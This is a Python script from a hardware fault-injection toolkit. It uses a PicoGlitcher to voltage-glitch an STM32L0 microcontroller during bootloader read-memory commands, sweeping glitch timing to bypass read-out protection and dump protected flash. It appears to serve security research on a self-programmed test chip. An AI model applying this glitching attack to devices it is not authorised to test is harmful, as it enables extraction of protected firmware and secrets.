#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: info@faultyhardware.de.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus.STM32Bootloader import STM32Bootloader
from findus import Database, PicoGlitcher, Helper, ErrorHandling
from findus.DebugInterface import DebugInterface

class Main:
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = PicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)
        self.glitcher.set_cpu_frequency(300_000_000)

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # choose pulse-shaping or crowbar glitching and set up the database
        if args.pulse_shaping:
            self.v_init = self.args.vinit
            self.glitcher.set_pulseshaping(vinit=self.v_init)
            self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "v_init", "v_intermediate"])
        elif args.delay2 is not None and args.length2 is not None:
            self.glitcher.set_lpglitch()
            self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "delay2", "length2"])
        else:
            self.glitcher.set_lpglitch()
            self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "number_of_pulses", "delay_between"])
        self.start_time = int(time.time())

        # STLink Debugger
        self.debugger = DebugInterface(target="stm32l0")

        # programming the target
        if args.program_target is not None:
            print("[+] Programming target.")
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l051.elf", rdp_level=args.program_target)

        # memory read settings
        self.bootcom = STM32Bootloader(port=self.args.target, serial_timeout=0.1, dump_address=0x08000000, dump_len=0x2000)
        self.dump_filename = f"{Helper.timestamp()}_memory_dump.bin"

        # error handling
        self.error_handler = ErrorHandling(max_fails=20, look_back=20, database=self.database)
        self.error_handler2 = ErrorHandling(max_fails=500, look_back=500, database=self.database)

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        if args.pulse_shaping:
            s_v_intermediate = self.args.vintermediate[0]
            e_v_intermediate = self.args.vintermediate[1]
        elif self.args.delay2 is not None and self.args.length2 is not None:
            s_delay2 = self.args.delay2[0]
            e_delay2 = self.args.delay2[1]
            s_length2 = self.args.length2[0]
            e_length2 = self.args.length2[1]
        else:
            s_delay_between = self.args.delay_between[0]
            e_delay_between = self.args.delay_between[1]
            s_number_of_pulses = self.args.number_of_pulses[0]
            e_number_of_pulses = self.args.number_of_pulses[1]

        experiment_id = 0
        while True:
            # flush garbage
            self.bootcom.flush()
            #self.glitcher.cleanup_pio()

            # trigger on read-memory command
            self.glitcher.switch_pio(0)
            self.glitcher.uart_trigger(0x11)

            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)
            if self.args.delay2 is not None and self.args.length2 is not None:
                delay2 = random.randint(s_delay2, e_delay2)
                length2 = random.randint(s_length2, e_length2)

            # dummy variables (not all are used in each case)
            v_intermediate = 0
            delay_between = 0
            number_of_pulses = 0
            if args.pulse_shaping:
                v_intermediate = Helper.random_point(s_v_intermediate, e_v_intermediate, 0.05, dtype=float)
                ps_lambda = f"lambda t:{v_intermediate} if t<{length} else {self.v_init}"
                self.glitcher.arm_pulseshaping_from_lambda(delay, ps_lambda, 2*length)
            elif self.args.delay2 is not None and self.args.length2 is not None:
                # the second glitch with delay2 and length2 is done further below
                self.glitcher.arm(delay, length)
            else:
                delay_between = random.randint(s_delay_between, e_delay_between)
                number_of_pulses = random.randint(s_number_of_pulses, e_number_of_pulses)
                self.glitcher.arm(delay, length, number_of_pulses, delay_between)

            # reset target
            self.glitcher.reset(0.01)
            time.sleep(0.01)

            # setup bootloader communication
            state = self.bootcom.init_bootloader()
            # setup memory read; this function triggers the glitch
            if b'ok' in state:
                state = self.bootcom.setup_memread()

            # block until glitch
            try:
                self.glitcher.block(timeout=0.2)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset()
                time.sleep(0.2)
                state = b'warning: timeout'

            # dump memory
            mem = b''
            if b'success' in state:
                # arm for the second time and trigger on 0xff (size of memory to read)
                if not args.pulse_shaping and self.args.delay2 is not None and self.args.length2 is not None:
                    self.glitcher.switch_pio(1)
                    self.glitcher.uart_trigger(0xff)
                    self.glitcher.arm(delay2, length2)

                # this triggers the second glitch (if requested)
                #state, mem = self.bootcom.dump_memory_to_file(self.dump_filename)
                #start = 0x08000000
                start = 0x08000000 - 0*0xFF
                size = 0xFF
                state, mem = self.bootcom.read_memory(start, size)

                # block until glitch
                if not args.pulse_shaping and self.args.delay2 is not None and self.args.length2 is not None:
                    try:
                        self.glitcher.block(timeout=1)
                    except Exception as _:
                        print("[-] Timeout received in block(). Continuing.")
                        self.glitcher.power_cycle_reset()
                        time.sleep(0.2)
                        state = b'warning: timeout (glitch2)'

                # DEBUG (to easily find the glitch with a logic analyzer)
                time.sleep(1)
                if mem != b'\x1f' and mem != b'\x79' and mem != b'':
                    time.sleep(4)

            # classify state
            color = self.glitcher.classify(state)

            # add to database
            state_str = b"state = " + state + b", mem = " + mem
            if args.pulse_shaping:
                self.database.insert(experiment_id, delay, length, self.v_init, v_intermediate, color, state_str)
            elif self.args.delay2 is not None and self.args.length2 is not None:
                self.database.insert(experiment_id, delay, length, delay2, length2, color, state_str)
            else:
                self.database.insert(experiment_id, delay, length, number_of_pulses, delay_between, color, state_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            if args.pulse_shaping:
                print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{self.v_init}\t{v_intermediate}\t{color}\t{state}", color))
            elif self.args.delay2 is not None and self.args.length2 is not None:
                print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{delay2}\t{length2}\t{color}\t{state}", color))
            else:
                print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{number_of_pulses}\t{delay_between}\t{color}\t{state}", color))

            # check for successive errors, re-programm target if too many successive errors occur.
            def error_action():
                # reprogram target and try again
                self.glitcher.power_cycle_target(1)
                time.sleep(1)
                self.bootcom.flush()
                # reprogram the target
                print("[+] Programming target.")
                self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l051.elf", rdp_level=1)
                self.glitcher.power_cycle_target(1)
            self.error_handler.check(experiment_id=experiment_id, response=state, expected=b'expected', keep=[b'ok', b'success', b'failure'], user_action=error_action)
            # if no errors occur at all (only expected), there might be something different wrong:
            def error_action2():
                print("[+] Glitch may be in the wrong position. Stop.")
                sys.exit(-1)
            self.error_handler2.check(experiment_id=experiment_id, response=state, expected=b'error', keep=[b'ok', b'success', b'failure'], user_action=error_action2)  

            # increase experiment id
            experiment_id += 1

            # Dump finished
            if state == b'success: dump finished':
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--delay2", required=False, nargs=2, help="second pulse delay start and end, relative to the first glitch", type=int, default=None)
    parser.add_argument("--length2", required=False, nargs=2, help="second pulse length start and end", type=int, default=None)
    parser.add_argument("--delay-between", required=False, nargs=2, help="delay between pulses for crowbar burst-glitching", type=int, default=[0, 0])
    parser.add_argument("--number-of-pulses", required=False, nargs=2, help="number of pulses pulses for crowbar burst-glitching (can also be 1 for single-crowbar glitching)", type=int, default=[1, 1])
    parser.add_argument("--pulse-shaping", required=False, action='store_true', help="Instead of crowbar glitching, perform a fault injection with a predefined voltage profile (requires PicoGlitcher v2).")
    parser.add_argument("--vinit", required=False, help="Initial voltage for pulse shaping", type=float, default=3.3)
    parser.add_argument("--vintermediate", required=False, nargs=2, help="Intermediate voltage for pulse shaping", type=float, default=[2.0, 2.5])
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--trigger-input", required=False, default="default", help="The trigger input to use (default, alt, ext1, ext2). The inputs ext1 and ext2 require the PicoGlitcher v2.")
    parser.add_argument("--program-target", required=False, metavar="RDP_LEVEL", type=int, default=None, help="Reprogram the target before glitching and set the RDP level.")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)
